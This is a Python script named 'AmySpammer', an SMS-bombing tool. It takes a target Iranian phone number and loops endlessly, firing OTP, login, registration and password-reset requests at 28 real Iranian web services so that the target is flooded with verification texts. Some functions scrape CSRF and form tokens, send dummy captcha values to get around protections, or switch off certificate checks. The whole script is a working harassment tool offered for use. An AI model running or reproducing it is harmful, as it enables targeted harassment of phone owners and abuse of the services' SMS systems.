from urllib3.exceptions import InsecureRequestWarning
import requests
import random
import time
import os


fnum3 = ['910', '911', '912', '913', '914', '915', '916', '917', '918', '919', '990', '991', '992', '993', '994', '932', '930', '933', '935', '936', '937', '938', '939', '901', '902', '903', '904', '905', '941', '920', '921', '922', '931', '934']
fnum4 = ['9990', '9998', '9944']
fnum5 = ['99910', '99911', '99913', '99914', '99996', '99997', '99998', '99999', '99810', '99811', '99812', '99814']


class color():
	RED = '\033[31m'
	GREEN = '\033[32m'
	YELLOW = '\033[33m'
	BLUE = '\033[34m'
	BLUE1 = '\033[94m'
	MAGENTA = '\033[35m'
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[36m'
	WHITE = '\033[37m'
	BLACK = '\033[1;30;48m'
	DEFAULT = '\033[91m\033[00m'


def clean():
	os.system(['clear', 'cls'][os.name == 'nt'])


def banner():
	print(f'''{color.GREEN}                           _____
    /\                    / ____|
   /  \   _ __ ___  _   _| (___  _ __   __ _ _ __ ___  _ __ ___   ___ _ __
  / /\ \ | '_ ` _ \| | | |\___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
 / ____ \| | | | | | |_| |____) | |_) | (_| | | | | | | | | | | |  __/ |
/_/    \_\_| |_| |_|\__, |_____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|
                     __/ |      | |
                    |___/       |_|      {color.BLUE1}   github.com/h4zelgr3y
	''')


def phone():
	try:
		a = int(input(f'{color.YELLOW}Enter Target Phone Number (e.g. 09123456789):{color.BLACK} '))
		return a
	except ValueError:
		return None


def getnum():
	n = phone()
	while(n == None or len(str(n)) != 10):
		print(f'{color.RED}Enter A Correct Phone Number!')
		n = phone()
	n = str(n)
	if(n[:3] in fnum3 or n[:4] in fnum4 or n[:5] in fnum5):
		return 1, n
	else:
		return 0, n


def ASM1(number):
	number = '0' + number
	djson = {'channel':'sms', 'recipient':number}
	s = requests.post('https://chilivery.com/client-api/otp/request', json = djson).json()
	if(s['status'] == True):
		return 1


def ASM2(number):
	number = '0' + number
	s = requests.post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={number}').json()
	if(s['status'] == True):
		return 1


def ASM3(number):
	number = '0' + number
	djson = {'credential':{'phoneNumber':number, 'role':'PASSENGER'}}
	s = requests.post('https://tap33.me/api/v2/user', json = djson).json()
	if(s['result'] == 'OK'):
		return 1


def ASM4(number):
	s = requests.get(f'https://core.gap.im/v1/user/add.json?mobile=+98{number}').json()
	if(s['status'] == 'success'):
		return 1


def ASM5(number):
	number = '0' + number
	data = {'phone':number}
	s = requests.post('https://api.snapp.ir/api/v1/sms/link', data = data).json()
	if(s['message'] == 'OK'):
		return 1


def ASM6(number):
	djson = {'auth':{'phoneNumber':number}}
	s = requests.post('https://ketabchi.org/api/v1/auth/requestVerificationCode', json = djson).json()
	if(s['success'] == True):
		return 1


def ASM7(number):
	number = '0' + number
	data = {'cellphone':number, 'captcha':'111'}
	s = requests.post('https://snappfood.ir/auth/login_with_no_pass', data = data).json()
	if(s['isRegistered'] == False and s['hasPassword'] == False and s['result'] == True):
		return 1
	elif(s['isRegistered'] == True and s['hasPassword'] == True):
		data = {'username_or_email':number, 'type':'sms', 'captcha':'111'}
		q = requests.post('https://snappfood.ir/customer/password/forgot', data = data).json()
		if(q['status'] == True):
			return 1


def ASM8(number):
	number = '0' + number
	data = '{"phone":"' + number + '"}: ""'
	s = requests.post('https://api.divar.ir/v5/auth/authenticate', data = data).json()
	if(s['authenticate_response'] == 'AUTHENTICATION_VERIFICATION_CODE_SENT'):
		return 1


def ASM9(number):
	number = '0' + number
	headers = {'Accept-Encoding':'gzip, deflate, sdch', 'Accept-Language':'en-US,en;q=0.8', 'Upgrade-Insecure-Requests':'1', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Cache-Control':'max-age=0', 'Connection':'keep-alive'}
	src = requests.get('https://www.sheypoor.com/session', headers = headers).text
	csrf = (src.split("tokenValue: '"))[1].split("',")[0]
	data = {'username':number, 'csrf-key':csrf}
	s = requests.post('https://www.sheypoor.com/auth', headers = headers, data = data).json()
	if(s['success'] == True):
		return 1


def ASM10(number):
	s = requests.get('https://www.digikala.com/users/login-register/').text
	rc = (s.split('<input type="hidden" name="rc" value="'))[1].split('"/>')[0]
	rd = (s.split('<input type="hidden" name="rd" value="'))[1].split('"/>')[0]
	data = {'rc':rc, 'rd':rd, 'login[email_phone]':number}
	r = requests.post('https://www.digikala.com/users/login-register/', data = data)


def ASM11(number):
	number = '0' + number
	data = {'send':'1', 'cellphone':number}
	s = requests.post('https://web.emtiyaz.app/json/login', data = data).text
	if('لطفآ کد تایید را وارد کنید' in s or 'تکرار تایید' in s):
		return 1


def ASM12(number):
	number = '0' + number
	s = requests.get('https://idpay.ir/user/auth').text
	cid = (s.split('<input type="hidden" name="captcha_sid" value="'))[1].split('" />')[0]
	ctk = (s.split('<input type="hidden" name="captcha_token" value="'))[1].split('" />')[0]
	fbi = (s.split('<input type="hidden" name="form_build_id" value="'))[1].split('" />')[0]
	#grr = (s.split(''))[1].split('')[0]
	data = {'phone':number, 'captcha_sid':cid, 'captcha_token':ctk, 'captcha_response':'Google+no+captcha', 'g-recaptcha-response':'', 'captcha_cacheable':'1', 'op':'بررسی+و+ادامه', 'form_build_id':fbi, 'form_id':'idpay_auth_form'}
	r = requests.post('https://idpay.ir/user/auth', data = data).text
	print(r)


def ASM13(number):
	number = '0' + number
	data = {'action':'getAppViaSMS', 'number':number}
	s = requests.post('https://hamrahcard.ir/wp-admin/admin-ajax.php', data = data).json()
	if(s['success'] == True):
		return 1


def ASM14(number):
	number = '0' + number
	djson = {'app_version':'1.2.0', 'isVirtual':False, 'manufacturer':'Linux', 'model':'Firefox 79.0', 'phone':number, 'platform':'pwa','serial':True, 'type':'CUSTOMER', 'uuid':True, 'version':'x86_64'}
	s = requests.post('https://api.alopeyk.com/api/v2/login', json = djson).json()
	if(s['status'] == 'success'):
		return 1
	elif(s['status'] == 'fail'):
		djson = {'app_version':'1.2.0', 'email':'a@b.co', 'firstname':'a', "isVirtual":False, 'lastname':'b', 'lat':'null','lng':'null', 'manufacturer':'Linux', 'model':'Firefox 79.0', 'phone':number,'platform':'pwa', 'referred_by':'', 'serial':True, 'type':'CUSTOMER', 'uuid':True, 'version':'x86_64'}
		s = requests.post('https://api.alopeyk.com/api/v2/register-customer', json = djson).json()
		if(s['status'] == 'success'):
			return 1


def ASM15(number):
	number = '0' + number
	data = {'username':'', 'phone':number}
	s = requests.post('https://alopeyk.com/api/sms/send.php', data = data).json()
	if(s['status'] == 'success'):
		return 1


def ASM16(number):
	number = '0' + number
	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
	s = requests.get(f'https://app.ezpay.ir:8443/open/v1/user/validation-code/{number}', verify = False).json()
	if(s['expireDate'] != 0):
		return 1


def ASM17(number):
	number = '0' + number
	s = requests.get(f'https://parscoders.com/cellphone/reset-password/{number}')
	if(s.status_code == 200):
		return 1


def ASM18(number):
	djson = {'properties':{'clientID':'152mm2s4cxontvyym3ut2xgat8bzydqc', 'clientVersion':'web', 'deviceID':'152mm2s4cxontvyym3ut2xgat8bzydqc', 'language':2}, 'singleRequest':{'getOtpTokenRequest':{'username':'98' + number}}}
	s = requests.post('https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', json = djson).json()
	if(s['properties']['statusCode'] == 200):
		return 1


def ASM19(number):
	number = '0' + number
	s = requests.post(f'https://www.driq.com/api/v1/account/ConfirmPhoneNumber?phonenumber={number}').json()
	if(s['succeeded'] == True):
		return 1


def ASM20(number):
	number = '0' + number
	djson = {'PhoneNumber':number}
	s = requests.post('http://accounts.gaj.ir/api/Account/SendPhoneNumberConfirmationCode', json = djson)
	if(s.status_code == 200):
		return 1


def ASM21(number):
	number = '0' + number
	s = requests.get('https://raygansms.com/SendTestResult.aspx').text
	vstate = (s.split('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="'))[1].split('" />')[0]
	vstateg = (s.split('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'))[1].split('" />')[0]
	eventv = (s.split('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="'))[1].split('" />')[0]
	data = {'__VIEWSTATE':vstate, '__VIEWSTATEGENERATOR':vstateg, '__EVENTVALIDATION':eventv, 'ctl00$ContentPlaceHolder1$TextBox1':number, 'ctl00$ContentPlaceHolder1$Button1':'ارسال+پیام', 'ctl00$TextBox1':'شماره+را+اینجا+وارد+کنید'}
	r = requests.post('https://raygansms.com/SendTestResult.aspx', data = data)
	if(r.status_code == 200):
		return 1


def ASM22(number):
	number = '0' + number
	djson = {'mobile':number}
	s = requests.post('https://app.itoll.ir/api/v1/auth/login', json = djson).json()
	if(s['success'] == True):
		return 1


def ASM23(number):
	number = '+98' + number
	djson = {'cellphone':number}
	s = requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', json = djson).json()
	if(s['status'] == 'OK'):
		return 1


def ASM24(number):
	number = '98' + number
	djson = {'msisdn':number}
	s = requests.post('https://app.lenz.ir:64014/api/v2/auth/forget/generate/otp', json = djson).json()
	if(s['message'] == 'این شماره قبلا ثبت نام نکرده است'):
		r = requests.post('https://app.lenz.ir:64014/api/v2/auth/register/otp/generate', json = djson).json()
		if(r['success'] == True):
			return 1
	elif('success' in s and s['success'] == True):
		return 1
	elif(s['message'] == 'تعداد دفعات ارسال رمز یکبار مصرف بیش از حد مجاز است'):
		return None


def ASM25(number):
	number = '0' + number
	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
	data = {'content':'', 'mobile_no':number}
	s = requests.post('https://auth-s.asanpardakht.net/auth/api/v1/authentication/signup/', verify = False, data = data)
	print(s.text)


def ASM26(number):
	number = '0' + number
	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
	djson = {'method':'phone_number', 'phone_number':number, 'my_server_api_version':1, 'my_app_type':'web', 'platform':'web', 'my_app_version':7, 'time_zone_offset':270}
	s = requests.post('https://homa.ghabouli.info/teacher/send_single_use_login_code', verify = False, json = djson).json()
	if(s['success'] == True):
		return 1


def ASM27(number):
	number = '98' + number
	requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
	s = requests.get('https://shgetdcmess.iranlms.ir/', verify = False).json()
	url = s['data']['API'][s['data']['default_api']]
	headers = {'Accept':'application/json, text/plain, */*', 'Accept-Encoding':'gzip, deflate, br', 'Accept-Language':'en-GB,en;q=0.5', 'Connection':'keep-alive', 'Content-Length':'96', 'Content-Type':'text/plain', 'Host':url[8:], 'Origin':'https://shadweb.iranlms.ir', 'Referer':'https://shadweb.iranlms.ir/', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0'}
	data = {'api_version':'3', 'method':'sendCode', 'data':{'phone_number':number, 'send_type':'SMS'}}
	r = requests.post(url, verify = False, headers = headers, data = data).json()
	print(r)


def ASM28(number):
	number = '0' + number
	djson = {'phone':number}
	s = requests.post('https://mobapi.banimode.com/api/bts/auth/request', json = djson).json()
	if(s['status'] == 'success' and s['status_code'] == 200):
		return 1


def spam(phonenum):
	done = 0
	while(True):
		k = eval('ASM' + str(random.randint(1, 28)) + '(phonenum)')
		if(k == 1):
			done += 1
			clean()
			banner()
			print(f'''{color.PURPLE}Successfully Send's: {color.BLACK}{done}''')
			time.sleep(1)


def main():
	try:
		clean()
		banner()
		cc, o = getnum()
		while(cc == 0):
			print(f'{color.RED}Enter A Correct Phone Number!')
			cc, o = getnum()
		clean()
		banner()
		spam(str(o))
	except KeyboardInterrupt:
		print(f'{color.RED}\nExiting...{color.DEFAULT}')
		time.sleep(1)


main()
